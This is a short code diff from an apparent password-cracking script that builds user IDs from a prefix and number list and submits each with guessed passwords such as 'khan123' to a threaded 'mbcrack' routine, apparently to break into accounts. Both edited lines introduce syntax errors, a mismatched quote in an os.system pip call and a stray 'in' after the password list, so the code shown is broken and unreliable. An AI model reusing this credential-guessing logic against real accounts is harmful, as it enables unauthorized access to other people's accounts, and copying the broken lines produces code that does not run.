@@ -12,7 +12,7 @@ try:
 	import concurrent.futures
 except ImportError:
 	print('\n [×] Futures module not installed!...\n')
-	os.system('pip install futures'n')
+	os.system('pip install futures'n")
     
 try:
 	import bs4
@@ -255,7 +255,7 @@ def method2():
 		print ("")
 		for guru in user:
 			uid = kode+guru
-			pwx = [guru,uid,'khan123','khan12345','khankhan']
+			pwx = [guru,uid,'khan123','khan12345','khankhan'] in
 			yaari.submit(mbcrack,uid,pwx,tl)
 	print(47*'-')
 	print ("")
